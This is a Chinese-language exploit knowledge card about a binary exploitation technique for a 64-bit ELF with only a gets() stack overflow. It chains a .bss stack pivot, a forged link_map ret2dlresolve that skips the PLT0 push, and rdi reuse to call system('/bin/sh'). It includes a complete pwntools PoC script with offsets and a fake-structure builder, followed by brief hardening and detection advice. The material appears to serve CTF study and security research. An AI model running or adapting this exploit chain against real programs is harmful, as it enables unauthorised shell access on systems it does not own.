---
id: binary-pwn-stack-gets-only-ret2dlresolve-fake-linkmap-ret2gets
title: 仅 gets 栈溢出 + 伪造 link_map ret2dlresolve：跳过 PLT0 push 传假 link_map，ret2gets 复用 rdi 传 /bin/sh
type: scenario
domain: binary
path: binary/pwn/stack
technique: gets-only-ret2dlresolve-fake-linkmap-ret2gets
aliases:
- 仅有 gets 栈溢出
- ret2gets
- gets 版 ret2dlresolve
- 无输出函数 getshell
- 无 pop rdi ret2dlresolve
- 跳过 PLT0 push 伪造 link_map
tags:
- pwn
- stack
- rop
- ret2dlresolve
- fake-linkmap
- gets
- ret2gets
- stack-pivot
- no-pop-rdi
- partial-relro
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V176
  verified_at: '2026-11-06T16:59:29+08:00'
  notes: 已对照原文核对：源码/编译参数、两阶段 gets 栈迁移、fake_Linkmap_payload 字段、l_addr=system-gets、plt_load=0x401026、plt_load 与第5字节-1输入均与原文 exp 一致；已删除误加的 ram_snoop alias 并修正 GOT+2 笔误；假 link_map 各字段的解析语义为卡片按 exp 补全，未本机复跑验证
---

## 一句话结论

当二进制只有 `gets` 栈溢出、没有输出函数、也没有 `pop rdi` 时，可以先用一次溢出把 `saved rbp` 改成 `.bss+0x40` 并把栈迁到函数体内的 `call gets` 处，让第二次 `gets` 把伪造 `link_map` 写进 `.bss`；第二次溢出再返回到 `gets@plt` 读入 `/bin/sh`，随后跳到 PLT0 内 `jmp [GOT+16]` 的指令（跳过 `push GOT[8]`），使栈顶的假 `link_map` 地址成为 `_dl_fixup` 的第一个参数、下一个 0 成为 `reloc_arg=0`；假 `link_map` 用 `l_addr = system - gets` 和覆盖 `gets@GOT-8` 的假符号解析出 `system`，同时复用 `gets` 留在 `rdi` 的输入缓冲区指针指向 `/bin/sh`，完成 getshell。

## 原理

- **入口只有 gets**：源码为 `char buf[0x40]; gets(buf);`，`gets` 不限制长度，可覆盖 `saved rbp` 与 `saved rip`；编译 `-no-pie -fno-stack-protector`，函数 epilogue 是 `leave; ret`，函数体内在调用 gets 前有 `lea rax,[rbp-0x40]; mov rdi,rax; call gets`。
- **第一次迁移到 bss**：payload 为 `0x40 填充 + saved_rbp=bss+0x40 + ret=0x401142`（0x401142 指向函数体内 `lea rax,[rbp-0x40]...call gets` 的位置）。`leave; ret` 后 `rbp=bss+0x40`，再次进入 gets 时 `rdi = rbp-0x40 = bss`，第二次输入直接落到 `.bss`。
- **第二次在 bss 布置伪栈帧与假 link_map**：payload 前 0x48 字节覆盖 bss 上的缓冲区和 saved rbp，随后依次放 `gets@plt`、`plt_load=0x401026`、`bss_stage`（假 link_map 地址），再从 `bss_stage` 开始放假 `link_map`。函数返回后先执行 `gets@plt` 读入第三行 `/bin/sh`，再返回到 `plt_load`。
- **跳过 PLT0 的 push**：正常 PLT0 的第一条指令是 `push QWORD PTR [GOT+8]`（真实 link_map），第二条是 `jmp QWORD PTR [GOT+16]`（`_dl_runtime_resolve`）。`plt_load=0x401026` 正好是第二条 `jmp` 的地址；直接跳到这里会跳过 push，`_dl_runtime_resolve` 便从当前栈顶取第一个参数。此时栈顶是 `bss_stage`（假 link_map 指针），下一个 qword 是 0，于是 `_dl_fixup(fake_link_map, 0)`。
- **假 link_map 解析出 system**：`l_addr = system - gets`；`l_info[DT_SYMTAB]` 指向假 `Elf64_Sym`，让 `st_value` 字段覆盖 `gets@GOT-8`（读到已解析的 gets 运行时地址），`_dl_fixup` 计算 `l_addr + sym->st_value = (system - gets) + gets = system`；`l_info[DT_STRTAB]` 指向含 `system` 的假字符串表，`l_info[DT_VERSYM]` 置 0 跳过符号版本检查；假 `Elf64_Rela` 的 `r_offset` 指向可写 GOT，`reloc_arg=0` 使 `reloc` 就是假 `DT_JMPREL` 指向的项。
- **rdi 复用（ret2gets）**：`gets` 的缓冲区指针会留在 `rdi`/`rax` 中，第三次 `gets` 把 `/bin/sh` 写入该缓冲区，解析出 `system` 后不再需要 `pop rdi`，直接以残留的 `rdi` 指向该字符串调用 `system("/bin/sh")`。原文提示目标程序会对字符串第 5 字节做一次 `-1`，因此发送 `/bin0sh`，程序把第 5 字节 `'0'`（0x30）减成 `'/'`（0x2f）后得到 `/bin/sh`；这是该题环境相关行为，迁移时需按目标验证。
- **为什么可行**：`gets` 同时提供了任意长度写（第二次写入 bss）和“返回指针留在寄存器”的复用来替代 `pop rdi`；PLT0 的第二条 `jmp` 可绕过 push，使 `_dl_fixup` 接受攻击者伪造的 link_map，从而在无 libc 泄漏、无输出函数的条件下解析出 `system`。

## 触发条件

- 64 位 ELF，`-no-pie`、无 canary、Partial RELRO（`.got.plt` 可写、`.dynamic` 只读）、NX。
- 程序唯一的输入/溢出点是 `gets`，没有 `read` 等可重复调用函数，也没有 `pop rdi; ret` 或其它直接控制 `rdi` 的 gadget。
- 函数体内存在 `lea rax,[rbp-0x40]; mov rdi,rax; call gets` 形式、可通过控制 rbp 复用的 gets 调用点（或等价栈迁移原语）。
- `.bss` 可写且地址已知，可容纳伪栈帧与假 link_map；已知目标 libc 的 `system - gets` 偏移差或同版本 libc。
- 触发前 `gets` 已在 GOT 中解析（延迟绑定已发生），否则 `gets@GOT-8` 读到的不是真实地址。

## 利用步骤

1. 计算缓冲区到 saved rbp/rip 的偏移（本例 0x40/0x48），确认 `gets@plt`、PLT0 的 `jmp [GOT+16]` 地址（本例 0x401026）、函数体内 `call gets` 前的地址（本例 0x401142）、`.bss` 地址。
2. 第一次溢出：`0x40 填充 + saved_rbp=bss+0x40 + ret=0x401142`，把执行流带回 gets 调用点，使第二次输入写入 `.bss`。
3. 计算 `l_addr = system - gets`，按模板构造假 `link_map`：`l_addr`、假 `Elf64_Rela`、假 `Elf64_Sym`（`st_value` 覆盖 `gets@GOT-8`）、假字符串表（`system`）、`l_info[DT_STRTAB]/[DT_SYMTAB]/[DT_JMPREL]` 指针，`l_info[DT_VERSYM]=0`。
4. 第二次溢出：`0x48 填充 + gets@plt + plt_load(0x401026) + bss_stage`，随后把假 link_map 放在 `bss_stage`，确保 `bss_stage` 在栈顶、其后一个 qword 为 0。
5. 第三次输入 `/bin0sh`（按题目第 5 字节 -1 的怪癖）；`gets` 返回后跳到 `plt_load`，`_dl_fixup` 用假 link_map 解析出 `system` 并执行，`rdi` 指向 `/bin/sh`。
6. 若崩溃，检查 `gets` 是否已解析、假结构 8/16 字节对齐、`bss_stage` 是否正好在栈顶、`reloc_arg` 下一个 qword 是否为 0、以及目标程序是否存在第 5 字节 -1 行为。

## PoC

```python
from pwn import *

elf = ELF('./pwn')
libc = elf.libc
p = process('./pwn')

def fake_linkmap_payload(addr, known_func_ptr, l_addr):
    lm  = p64(l_addr & (2**64 - 1))        # 0x00 l_addr = system - gets
    lm += p64(0)                            # 0x08
    lm += p64(addr + 0x18)                  # 0x10 指向假结构
    lm += p64((addr + 0x30 - l_addr) & (2**64 - 1))
    lm += p64(0x7)                          # 假 Rela r_info
    lm += p64(0)
    lm += p64(0)
    lm += p64(0)
    lm += p64(known_func_ptr - 0x8)         # 0x38 假 Sym st_value 覆盖 gets@GOT-8
    lm += b'/bin/sh\x00'
    lm  = lm.ljust(0x68, b'A')
    lm += p64(addr)                         # l_info[DT_STRTAB]
    lm += p64(addr + 0x38)                  # l_info[DT_SYMTAB]
    lm  = lm.ljust(0xf8, b'A')
    lm += p64(addr + 0x8)                   # l_info[DT_JMPREL]
    return lm

BSS      = 0x404030 + 0x700
STAGE    = BSS + 0x100
GETS_PLT = elf.plt['gets']
GETS_GOT = elf.got['gets']
L_ADDR   = libc.sym['system'] - libc.sym['gets']
PLT_LOAD = 0x401026                        # PLT0 内 jmp [GOT+16]
CALL_GETS = 0x401142                       # 函数体内 lea rax,[rbp-0x40]...call gets

# 第一次溢出：rbp 迁到 bss+0x40，第二次 gets 写入 bss
p.sendline(b'a' * 0x40 + p64(BSS + 0x40) + p64(CALL_GETS))

# 第二次溢出：伪栈帧 + 假 link_map
payload  = b'a' * 0x48 + p64(GETS_PLT) + p64(PLT_LOAD) + p64(STAGE)
payload  = payload.ljust(0x100, b'\x00')
payload += fake_linkmap_payload(STAGE, GETS_GOT, L_ADDR)
p.sendline(payload)

# 第三次输入：原文环境第 5 字节会被 -1，故用 '0' 占位
p.sendline(b'/bin' + p8(u8(b'/') + 1) + b'sh\x00')
p.interactive()
```

说明：以上按原文 exp 重写，地址与“第 5 字节 -1”行为均为原题环境相关，未在本库复跑；迁移时需按目标 ELF/libc 重新计算并验证。

## 变体与关联

- 变体：若程序同时有 `read`，可直接用 `read` 写假结构，不必依赖 gets 的第二次输入与 rbp 迁移。
- 变体：若不跳过 PLT0 的 push，则 `_dl_fixup` 收到真实 link_map，需改用大 `reloc_arg` 越界查表或先覆写 `GOT[1]`；参见 [[binary-pwn-stack-ret2dlresolve-partial-relro-64-fake-linkmap]]。
- 变体：`ret2gets` 复用 rdi 也适用于其他“无 pop rdi”场景：把目标字符串放在 gets 缓冲区，让后续函数直接使用残留 rdi。
- 关联：[[binary-pwn-stack-ret2dlresolve-partial-relro-64-fake-reloc]]（伪造 Rela/Sym 的大 reloc_arg 版本）、[[binary-pwn-stack-ret2dlresolve-no-relro-dystrtab]]（No RELRO 改 DT_STRTAB）、[[binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage]]（gets 写 /bin/sh 的两阶段链）。

## 检测与防御

- 编译加固：Full RELRO + BIND_NOW 关闭延迟绑定，使伪造 link_map/reloc 解析失效；PIE + ASLR 隐藏 `.bss`、PLT 与 GOT 地址；开启 canary。
- 代码修复：禁止使用 `gets`，改用 `fgets`/`read` 等有界输入；不要把用户可控的 rbp 作为写基址；对关键 GOT 与动态解析路径做完整性校验。
- 运行期检测：监控 `.bss` 中出现 `link_map`/`Elf64_Sym`/`Elf64_Rela` 特征、`.got.plt` 被改写、直接跳到 PLT0 第二条 `jmp` 而非正常 PLT 入口、以及异常的大块 gets 输入。
- 沙箱：seccomp 限制 `execve`，降低 getshell 后的影响。
